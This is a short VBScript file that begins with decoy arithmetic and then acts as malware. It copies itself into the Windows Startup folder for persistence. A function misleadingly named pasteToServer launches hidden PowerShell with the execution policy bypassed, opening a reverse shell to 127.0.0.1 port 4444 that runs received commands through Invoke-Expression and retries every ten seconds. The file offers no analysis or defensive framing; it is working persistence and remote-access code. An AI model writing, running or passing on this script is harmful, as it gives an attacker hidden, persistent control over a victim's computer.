Dim x, y, z
x = 10
y = 20
z = x + y

Set objShell = CreateObject("WScript.Shell")
strAppData = objShell.ExpandEnvironmentStrings("%APPDATA%")
strStFolder = strAppData & "\Microsoft\Windows\Start Menu\Programs\Startup\"
strScriptName = WScript.ScriptName
strScriptPath = WScript.ScriptFullName
strStartupPath = strStFolder & strScriptName

Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.CopyFile strScriptPath, strStartupPath

Set WshShell = WScript.CreateObject("WScript.Shell")

Function pasteToServer()
  Dim powershell_command
  powershell_command = "powershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient('127.0.0.1', 4444); $NetworkStream = $TCPClient.GetStream(); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); function WriteToStream($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}; $StreamWriter.Write($String + 'Ayhu> '); $StreamWriter.Flush()} WriteToStream ''; while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) { $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1); $Output = try { Invoke-Expression $Command 2>&1 | Out-String } catch { $_ | Out-String } WriteToStream ($Output) } $StreamWriter.Close()"""
  cmd_command = "cmd /c " & powershell_command

  Set execCmd = WshShell.Exec(cmd_command)
  Do While execCmd.Status = 0
    WScript.Sleep 100
  Loop

  If execCmd.ExitCode = 0 Then
    
    pasteToServer = True
  Else
    
    pasteToServer = False
  End If
End Function

connected = pasteToServer()

Do While Not connected
  
  WScript.Sleep 10000
  connected = pasteToServer()
Loop
